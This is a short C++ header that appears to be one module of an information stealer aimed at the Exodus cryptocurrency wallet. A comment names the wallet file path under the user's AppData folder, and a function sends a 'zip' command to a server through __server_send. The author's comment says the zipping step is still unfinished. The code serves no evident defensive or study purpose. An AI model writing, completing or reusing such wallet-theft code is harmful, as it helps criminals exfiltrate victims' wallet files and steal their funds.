#pragma once
#include <Windows.h>
#include <iostream>
#include "server.h"

//C:\Users\skar\AppData\Roaming\Exodus\exodus.wallet
// gonna fix this soon but yh nned to fix ziping method 
auto __exodus() -> bool
{
	__server_send("zip");

	return true;
}